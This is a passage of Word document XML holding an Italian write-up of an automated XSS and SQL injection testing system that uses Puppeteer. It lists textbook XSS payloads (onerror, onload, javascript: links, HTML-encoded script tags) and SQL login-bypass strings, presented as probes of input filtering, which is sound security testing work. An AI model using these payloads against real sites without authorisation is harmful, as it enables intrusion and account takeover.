        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Invia i cookie a un server controllato dall'attaccante.</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Questi test verificano la capacità dell'applicazione di filtrare o codificare correttamente il contenuto per impedire che codice malevolo venga interpretato dal browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBC9EE9" w14:textId="5AEB3F05" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>1.2 XSS Event-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Based</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Event Handler Injection)</w:t>
      </w:r>
      <w:r w:rsidR="001247A9" w:rsidRPr="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Non sempre è necessario un &lt;script&gt; per eseguire codice dannoso: anche attributi come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>onload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> possono essere sfruttati. Esempi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B291150" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="21"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Gestione errori immagini</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3736ABE5" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t xml:space="preserve">="x" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>="alert('XSS')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476D35F3" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Esecuzione su caricamento del body</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD9F76B" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>&lt;body onload="alert('XSS')"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF58056" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Caricamento di SVG</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">(simili meccanismi con SVG </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>inline</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E49537C" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Queste tecniche spesso bypassano filtri che bloccano solo i tag &lt;script&gt;.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20515592" w14:textId="050CAA52" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>1.3 XSS tramite Pseudo-protocollo JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Un altro metodo sfrutta il protocollo speciale </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">: negli attributi </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2325A3C6" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">&lt;a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>javascript:alert</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>('XSS')"&gt;Click me&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A6759A" w14:textId="7F029B78" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Questo permette di eseguire codice JavaScript quando l’utente clicca sul link.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75DD56A7" w14:textId="5B2EAE93" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">1.4 XSS con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Encoding</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTML</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Il sistema include anche payload con caratteri HTML </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>encodati</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>, per verificare se l’applicazione li decodifica prima di filtrarli:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7173A533" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&amp;#60;script&amp;#62;alert('XSS')&amp;#60;/script&amp;#62;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D714320" w14:textId="10683B66" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">1.5 Il Ruolo di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Puppeteer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> nella Rilevazione degli XSS</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Qui entra in gioco </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Puppeteer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">, un elemento chiave del sistema. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Puppeteer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> è una potente libreria Node.js che permette di controllare il browser </w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Chrome o </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Chromium</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> come se fosse un utente reale. Con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Puppeteer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>, il sistema può:</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Aprire pagine web come farebbe un vero utente</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Iniettare e verificare se i payload XSS vengono effettivamente eseguiti</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Osservare modifiche al DOM, come l</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>apparizione di &lt;div id='</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>-ok'&gt;</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Simulare clic, input e altri eventi per triggerare XSS </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>basati su interazioni</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Catturare screenshot o console log per documentare i risultati</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Questa capacità di interazione dinamica rende </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Puppeteer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> indispensabile per scoprire vulnerabilità che si attivano solo durante l'uso reale dell’applicazione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCD9DE2" w14:textId="78B9B3D0" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>2. Attacchi SQL Injection</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Il sistema copre anche un ampio spettro di SQL Injection, un altro tipo di vulnerabilità critica.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBB911B" w14:textId="77B1E4C7" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>2.1 Bypass di Autenticazione</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Vengono testati payload come:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A245FC6" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407B16A1" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>' OR 1=1 --</w:t>
      </w:r>
    </w:p>
